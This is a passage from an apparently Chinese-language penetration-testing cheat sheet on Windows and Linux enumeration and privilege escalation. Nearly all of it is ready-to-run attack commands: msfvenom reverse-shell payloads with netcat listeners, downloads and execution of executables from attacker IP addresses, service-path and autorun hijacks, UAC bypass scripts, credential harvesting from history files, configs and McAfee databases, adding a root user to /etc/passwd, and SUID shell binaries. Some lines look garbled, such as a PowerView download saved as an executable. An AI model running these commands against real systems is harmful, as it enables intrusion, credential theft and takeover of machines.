<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">net user<br></code></pre></td></tr></table></figure>

<p>获取特定用户的信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">net user &lt;user&gt;<br></code></pre></td></tr></table></figure>

<p>检查用户权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">whoami /priv<br></code></pre></td></tr></table></figure>

<p>查看您所属的组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">whoami /groups<br></code></pre></td></tr></table></figure>

<p>查看接口和网络信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ipconfig /all<br></code></pre></td></tr></table></figure>

<p>查看所有活动的 TCP 连接以及主机正在侦听的 TCP 和 UDP 端口</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">netstat -ant<br></code></pre></td></tr></table></figure>

<p>列出正在运行的进程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">tasklist<br></code></pre></td></tr></table></figure>

<p>查看系统任务</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">schtasks<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="不带引号的服务路径"><a href="#不带引号的服务路径" class="headerlink" title="不带引号的服务路径"></a>不带引号的服务路径</h3><p>检测</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">wmic service get Name,State,PathName | findstr <span class="hljs-string">&quot;Program&quot;</span>  <br>sc qc &lt;service_name&gt;  <br>\\ BINARY_PATH_NAME display Unquoted Service Paths, without <span class="hljs-string">&quot;&quot;</span><br>powershell <span class="hljs-string">&quot;get-acl -Path &#x27;C:\Program Files (x86)\System Explorer&#x27; | format-list&quot;</span><br></code></pre></td></tr></table></figure>

<p>利用 - 攻击者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f exe &gt; name &lt;name_inside_the_path&gt;.exe  <br>nc -nvlp &lt;port&gt;<br></code></pre></td></tr></table></figure>

<p>漏洞利用 - windows</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">iwr -uri &lt;ip&gt;/&lt;service_eecutable_name&gt; -Outfile &lt;service_executable_name&gt;<br>move &lt;name_inside_the_path&gt;.exe &lt;service_path&gt;  <br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sc stop &lt;service_name&gt;<br>sc start &lt;service_name&gt;<br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">shutdown /r<br></code></pre></td></tr></table></figure>

<h3 id="binPath-服务-PrivEsc"><a href="#binPath-服务-PrivEsc" class="headerlink" title="binPath - 服务 [PrivEsc]"></a>binPath - 服务 [PrivEsc]</h3><p>检测</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">Import-Module ./PowerUp.ps1<br>Get-ModifiableService -Verbose<br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">Get-ModifiableService -Verbose<br>wmic service get Name,State,PathName | findstr <span class="hljs-string">&quot;Running&quot;</span> | findstr <span class="hljs-string">&quot;Program&quot;</span>  <br>wmic service get Name,State,PathName | findstr <span class="hljs-string">&quot;Program&quot;</span>  <br>icacls &lt;pathname&gt;  <br><span class="hljs-comment">//(F) and (i) (F)</span><br>accesschk.exe -wuvc &lt;service_name&gt;<br><span class="hljs-comment">//RW Everyone  </span><br><span class="hljs-comment">//  SERVICE_CHANGE_CONFIG</span><br>sc qc &lt;service_name&gt;<br></code></pre></td></tr></table></figure>

<p>利用 - Windows [PrivEsc]</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">certutil -urlcache -f http:<span class="hljs-comment">//10.9.1.137:803/ok.exe ok.exe  </span><br>sc config &lt;name_ service&gt; binPath=<span class="hljs-string">&quot;C:\Users\files\ok.exe&quot;</span> obj= LocalSystem  <br>sc stop &lt;service_name&gt;  <br>sc query &lt;service_name&gt;  <br>sc start &lt;service_name&gt;  <br></code></pre></td></tr></table></figure>

<p><code>https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite</code></p>
<h3 id="冒充特权"><a href="#冒充特权" class="headerlink" title="冒充特权"></a>冒充特权</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">PrintSpoofer64.exe -i -c cmd<br></code></pre></td></tr></table></figure>

<p><code>https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe</code></p>
<h3 id="自动运行"><a href="#自动运行" class="headerlink" title="自动运行"></a>自动运行</h3><p>检测 - windows</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu <span class="hljs-string">&quot;&quot;</span>C:\Program Files\Autorun Program<span class="hljs-string">&quot;  </span><br><span class="hljs-string">\\FILE_ALL_ACCESS</span><br></code></pre></td></tr></table></figure>

<p>剥削 - kali</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p windows/meterpreter/reverse_tcp lhost=&lt;ip&gt; lport=&lt;port&gt; -f exe -o program.exe<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">iex (iwr http:<span class="hljs-comment">//&lt;file_server_IP&gt;/PowerView.ps1 -Outfile program.exe)</span><br>move program.exe <span class="hljs-string">&quot;C:\Program Files\Autorun Program&quot;</span><br>logoff<br></code></pre></td></tr></table></figure>

<h3 id="启动应用程序"><a href="#启动应用程序" class="headerlink" title="启动应用程序"></a>启动应用程序</h3><p>检测 - Windows</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">icacls.exe <span class="hljs-string">&quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span> | findstr (F) <br>\\BUILTIN\Users:(F)<br></code></pre></td></tr></table></figure>

<p>msfvenom - 攻击者虚拟机</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f exe -o ok.exe<br></code></pre></td></tr></table></figure>

<p>利用 - Windows</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">iex (iwr http:<span class="hljs-comment">//&lt;file_server_IP&gt;/PowerView.ps1 -Outfile ok.exe)</span><br>move ok.exe “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”<br>logoff<br></code></pre></td></tr></table></figure>

<h3 id="绕过UAC（bypass-uac）"><a href="#绕过UAC（bypass-uac）" class="headerlink" title="绕过UAC（bypass uac）"></a>绕过UAC（bypass uac）</h3><p>在具有本地管理员用户的计算机上获得反向 shell 后，可能需要绕过用户帐户控制 (UAC) 来执行特定的恶意操作，例如持久安装恶意软件、修改安全设置或利用系统漏洞。这可以通过旨在绕过 UAC 施加的限制的专门技术和工具来完成。 <code>https://decoder.cloud/2017/02/03/bypassing-uac-from-a-remote-powershell-and-escalting-to-system/</code></p>
<h4 id="事件查看器"><a href="#事件查看器" class="headerlink" title="事件查看器"></a>事件查看器</h4><p>第 1 步 - 卡利</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; EXITFUNC=thread -f exe &gt; ok.exe<br></code></pre></td></tr></table></figure>

<p>第 2 步 - 赢得拥有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">cd C:\Windows\tasks<br>iwr -uri <span class="hljs-number">192.168</span><span class="hljs-number">.119</span><span class="hljs-number">.139</span>:<span class="hljs-number">805</span>/shell.exe -Outfile shell.exe<br>Start-Process -NoNewWindow -FilePath C:\Windows\Tasks\shell.exe<br></code></pre></td></tr></table></figure>

<p> 第 3 步 - 赢得拥有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">iwr -uri <span class="hljs-number">192.168</span><span class="hljs-number">.119</span><span class="hljs-number">.139</span>:<span class="hljs-number">805</span>/powerup.ps1 -Outfile powerup.ps1<br>powershell -ep bypass<br>Import-Module ./PowerUp.ps1<br>Invoke-AllChecks<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[+] Run a BypassUAC attack to elevate privileges to admin.<br></code></pre></td></tr></table></figure>

<p>第4步-卡利</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="hljs-number">192.168</span><span class="hljs-number">.119</span><span class="hljs-number">.139</span> LPORT=<span class="hljs-number">8445</span> -f exe &gt; ok.exe<br></code></pre></td></tr></table></figure>

<p>第 5 步 - 赢得拥有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">wget <span class="hljs-number">192.168</span><span class="hljs-number">.119</span><span class="hljs-number">.139</span>:<span class="hljs-number">805</span>/Invoke-EventViewer.ps1 -O Invoke-EventViewer.ps1<br>. .\Invoke-EventViewer.ps1<br>Invoke-EventViewer cmd.exe /c <span class="hljs-string">&quot;C:\Windows\tasks\shell2.exe&quot;</span><br>Invoke-EventViewer C:\Windows\tasks\shell2.exe<br></code></pre></td></tr></table></figure>

<p><code>https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1</code></p>
<h4 id="Fodhelper绕过"><a href="#Fodhelper绕过" class="headerlink" title="Fodhelper绕过"></a>Fodhelper绕过</h4><p><code>https://raw.githubusercontent.com/winscripting/UAC-bypass/master/FodhelperBypass.ps1</code></p>
<h3 id="捕获配置文件凭据"><a href="#捕获配置文件凭据" class="headerlink" title="捕获配置文件凭据"></a>捕获配置文件凭据</h3><p>Powershell 历史</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt<br></code></pre></td></tr></table></figure>

<p>利用保存的 Windows 凭据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">cmdkey /<span class="hljs-built_in">list</span>  <br>runas /savecred /user:admin cmd.exe<br></code></pre></td></tr></table></figure>

<p>IIS 配置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">type C:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\Config\web.config | findstr connectionString  <br>type C:\inetpub\wwwroot\web.config | findstr connectionString<br></code></pre></td></tr></table></figure>

<p>从软件中检索凭证：PuTTY</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f <span class="hljs-string">&quot;Proxy&quot;</span> /s<br></code></pre></td></tr></table></figure>

<p>无人值守的 Windows 安装</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Unattend.xml<br>C:\Windows\Panther\Unattend.xml<br>C:\Windows\Panther\Unattend\Unattend.xml<br>C:\Windows\system32\sysprep.inf<br>C:\Windows\system32\sysprep\sysprep.xml<br></code></pre></td></tr></table></figure>

<p>识别</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">dir /s *.db<br></code></pre></td></tr></table></figure>

<p>McAfee Enterprise Endpoint Security - 安装期间使用的凭据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\ProgramData\McAfee\Agent\DB\ma.db<br>sqlitebrowser ma.db<br>python2 mcafee_sitelist_pwd_decrypt.py &lt;AUTH PASSWD VALUE&gt;<br></code></pre></td></tr></table></figure>

<p><code>https://raw.githubusercontent.com/funoverip/mcafee-sitelist-pwd-decryption/master/mcafee_sitelist_pwd_decrypt.py</code></p>
<h2 id="Windows枚举工具"><a href="#Windows枚举工具" class="headerlink" title="Windows枚举工具"></a>Windows枚举工具</h2><p>PowerUp.ps1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">Import-Module ./PowerUp.ps1<br>Invoke-AllChecks<br></code></pre></td></tr></table></figure>

<p><code>https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1</code></p>
<p>winPEASany.exe</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">winPEASany.exe<br></code></pre></td></tr></table></figure>

<p><code>https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</code></p>
<p>windows-privesc-check2.exe</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">windows-privesc-check2.exe --dump -G<br></code></pre></td></tr></table></figure>

<p><code>https://github.com/pentestmonkey/windows-privesc-check</code></p>
<h1 id="十七、Linux-枚举和权限提升"><a href="#十七、Linux-枚举和权限提升" class="headerlink" title="十七、Linux 枚举和权限提升"></a>十七、Linux 枚举和权限提升</h1><h2 id="枚举-1"><a href="#枚举-1" class="headerlink" title="枚举"></a>枚举</h2><p>获取系统发行版和版本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">cat /etc<span class="hljs-comment">/*-release</span><br></code></pre></td></tr></table></figure>

<p>获取内核版本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">cat /proc/version   <br>uname -a<br></code></pre></td></tr></table></figure>

<p>查看变量环境</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">env<br>cat /etc/profile<br>cat /etc/bashrc<br>cat ~/.bash_profile<br>cat ~/.bashrc<br>cat ~/.bash_logout<br>cat ~/.zshrc<br></code></pre></td></tr></table></figure>

<p>查看用户命令历史记录</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">cat ~/.bash_history<br>cat ~/.zsh_history<br>cat ~/.nano_history<br>cat ~/.atftp_history<br>cat ~/.mysql_history<br>cat ~/.php_history<br></code></pre></td></tr></table></figure>

<p>列出正在运行的进程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ps aux<br></code></pre></td></tr></table></figure>

<p>查看接口和网络信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">ifconfig<br>ip addr<br></code></pre></td></tr></table></figure>

<p>查看所有活动的 TCP 连接以及主机正在侦听的 TCP 和 UDP 端口。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">netstat -ant<br></code></pre></td></tr></table></figure>

<p>获取映射到 IP 的 DNS 解析器和主机</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">cat /etc/resolv.conf<br>cat /etc/hosts<br></code></pre></td></tr></table></figure>

<p>获取系统用户、组和密码信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">cat /etc/passwd<br>cat /etc/shadow<br></code></pre></td></tr></table></figure>

<h3 id="提取数据库信息"><a href="#提取数据库信息" class="headerlink" title="提取数据库信息"></a>提取数据库信息</h3><h4 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><p>作为 postgres 用户的 psql 终端</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">su postgres<br>psql<br></code></pre></td></tr></table></figure>

<p>列出数据库</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">\<span class="hljs-built_in">list</span><br></code></pre></td></tr></table></figure>

<p>选择数据库</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">\c &lt;database&gt;<br></code></pre></td></tr></table></figure>

<p>列出表格</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">\d<br></code></pre></td></tr></table></figure>

<p>转储</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">select * from &lt;table&gt;;<br></code></pre></td></tr></table></figure>

<p>读取文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">CREATE TABLE <span class="hljs-title function_">demo</span><span class="hljs-params">(t text)</span>;<br>COPY demo from <span class="hljs-string">&#x27;&lt;filename&gt;&#x27;</span>;<br>SELECT * FROM demo;<br></code></pre></td></tr></table></figure>

<h4 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h4><p>访问数据库</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sqlite3 &lt;database.db&gt;<br></code></pre></td></tr></table></figure>

<p>列出表格</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.tables<br></code></pre></td></tr></table></figure>

<p>转储</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">select * from &lt;table&gt;;<br></code></pre></td></tr></table></figure>

<h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mysql -u root -h localhost -p<br></code></pre></td></tr></table></figure>

<p>列出数据库</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">show databases;<br></code></pre></td></tr></table></figure>

<p>选择数据库</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">use &lt;database&gt;;<br></code></pre></td></tr></table></figure>

<p>列出表格</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">show tables;<br></code></pre></td></tr></table></figure>

<p>转储</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">SELECT * FROM &lt;table&gt;;<br></code></pre></td></tr></table></figure>

<h3 id="其他提示"><a href="#其他提示" class="headerlink" title="其他提示"></a>其他提示</h3><h2 id="对-Web-服务器文件-var-www-html-执行代码审查；-检查日志文件中的凭据；"><a href="#对-Web-服务器文件-var-www-html-执行代码审查；-检查日志文件中的凭据；" class="headerlink" title="对 Web 服务器文件 (&#x2F;var&#x2F;www&#x2F;html) 执行代码审查；-&gt; 检查日志文件中的凭据；"></a>对 Web 服务器文件 (&#x2F;var&#x2F;www&#x2F;html) 执行代码审查；-&gt; 检查日志文件中的凭据；</h2><h2 id="权限提升-1"><a href="#权限提升-1" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="定时任务-PrivEsc"><a href="#定时任务-PrivEsc" class="headerlink" title="定时任务 [PrivEsc]"></a>定时任务 [PrivEsc]</h3><p>枚举</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">cat /var/<span class="hljs-built_in">log</span>/cron.<span class="hljs-built_in">log</span>                                                                                                                                              <br>cat /etc/crontab<br></code></pre></td></tr></table></figure>

<p>提权</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">echo <span class="hljs-string">&quot;chmod +s /bin/bash&quot;</span> &gt;&gt; script.sh<br></code></pre></td></tr></table></figure>

<h3 id="SUID-PrivEsc"><a href="#SUID-PrivEsc" class="headerlink" title="SUID [PrivEsc]"></a>SUID [PrivEsc]</h3><p>枚举</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">find / -perm -u=s -type f <span class="hljs-number">2</span>&gt;/dev/null<br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">id<br>find / -perm -u=s -type f -group &lt;group&gt; <span class="hljs-number">2</span>&gt;/dev/null<br></code></pre></td></tr></table></figure>

<p>利用<br><code>https://gtfobins.github.io/</code></p>
<h3 id="功能-PrivEsc"><a href="#功能-PrivEsc" class="headerlink" title="功能 [PrivEsc]"></a>功能 [PrivEsc]</h3><p>枚举</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">getcap -r / <span class="hljs-number">2</span>&gt;/dev/null<br></code></pre></td></tr></table></figure>

<p>利用<br><code>https://gtfobins.github.io/</code></p>
<h3 id="带有-Sudo-的二进制文件-PrivEsc"><a href="#带有-Sudo-的二进制文件-PrivEsc" class="headerlink" title="带有 Sudo 的二进制文件 [PrivEsc]"></a>带有 Sudo 的二进制文件 [PrivEsc]</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo -l<br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">cat /etc/sudoers<br></code></pre></td></tr></table></figure>

<p>利用<br><code>https://gtfobins.github.io/</code></p>
<h4 id="通过-sudo-PrivEsc-以具有权限的其他用户身份运行命令"><a href="#通过-sudo-PrivEsc-以具有权限的其他用户身份运行命令" class="headerlink" title="通过 sudo [PrivEsc] 以具有权限的其他用户身份运行命令"></a>通过 sudo [PrivEsc] 以具有权限的其他用户身份运行命令</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo -u &lt;username&gt; &lt;command&gt;<br></code></pre></td></tr></table></figure>

<h3 id="弱文件权限-Passwd-Writabble-PrivEsc"><a href="#弱文件权限-Passwd-Writabble-PrivEsc" class="headerlink" title="弱文件权限&#x2F;Passwd Writabble [PrivEsc]"></a>弱文件权限&#x2F;Passwd Writabble [PrivEsc]</h3><p>枚举</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">ls -la /etc/passwd<br>ls -la /etc/shadow<br></code></pre></td></tr></table></figure>

<p>提权</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">echo <span class="hljs-string">&quot;user:$(openssl passwd password123):0:0:root:/root:/usr/bin/bash&quot;</span> &gt;&gt; /etc/passwd<br></code></pre></td></tr></table></figure>

<h3 id="NFS根挤压"><a href="#NFS根挤压" class="headerlink" title="NFS根挤压"></a>NFS根挤压</h3><p>检测 - VM 拥有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">cat /etc/exports<br></code></pre></td></tr></table></figure>

<p>查看具有访问权限的 nfs 目录 - 攻击者虚拟机</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">showmount -e &lt;ip&gt;<br></code></pre></td></tr></table></figure>

<p>获取 nfs 版本 - 攻击者虚拟机</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">rpcinfo &lt;ip&gt;<br></code></pre></td></tr></table></figure>

<p>安装 - 攻击者虚拟机</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">mkdir /tmp/<span class="hljs-number">1</span><br>mount -o rw,vers=<span class="hljs-number">2</span> &lt;ip&gt;:/&lt;nfs_directory&gt; /tmp/<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>为 privesc 创建并编译文件 - 攻击者虚拟机</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">echo <span class="hljs-string">&#x27;int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;&#x27;</span> &gt; /tmp/<span class="hljs-number">1</span>/x.c<br>gcc /tmp/<span class="hljs-number">1</span>/x.c -o /tmp/<span class="hljs-number">1</span>/x<br>chmod +s /tmp/<span class="hljs-number">1</span>/x<br></code></pre></td></tr></table></figure>

<p>利用 - VM 拥有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">/tmp/x<br>id<br></code></pre></td></tr></table></figure>

<h3 id="sudo-v1-28-sickrov-PrivEsc"><a href="#sudo-v1-28-sickrov-PrivEsc" class="headerlink" title="sudo &lt; v1.28 - @sickrov [PrivEsc]"></a>sudo &lt; v1.28 - @sickrov [PrivEsc]</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo -u#<span class="hljs-number">-1</span> /bin/bash<br></code></pre></td></tr></table></figure>

<h3 id="Docker-突破-PrivEsc"><a href="#Docker-突破-PrivEsc" class="headerlink" title="Docker 突破 [PrivEsc]"></a>Docker 突破 [PrivEsc]</h3><p>搜索套接字</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">find / -name docker.sock <span class="hljs-number">2</span>&gt;/dev/null<br></code></pre></td></tr></table></figure>

<p>列出图像</p>
